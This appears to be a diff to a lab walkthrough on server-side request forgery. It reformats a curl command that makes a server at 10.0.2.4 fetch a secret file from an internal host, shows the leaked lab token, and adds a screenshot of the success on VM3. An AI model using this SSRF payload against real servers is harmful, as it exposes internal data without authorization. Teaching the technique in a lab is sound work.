@@ -191,9 +191,7 @@ Notice that `127.0.0.1` refers to VM1, not VM3, because the HTTP request is made
 Run:
 
 ```console
-$ curl -G \
-    --data-urlencode "url=http://10.0.2.5:8080/secret.txt" \
-    http://10.0.2.4/fetch.php
+$ curl -G --data-urlencode "url=http://10.0.2.5:8080/secret.txt" http://10.0.2.4/fetch.php
 ```
 
 Expected output:
@@ -201,6 +199,9 @@ Expected output:
 ```text
 Confidential lab token: SSRF-LAB-2026
 ```
+
+this screenshot shows the execution of the failing command and the successful command on VM3:
+![alt text](images/lab-ssrf-vm3-success.png "attack success on VM3")
 
 The attack is successful!
 
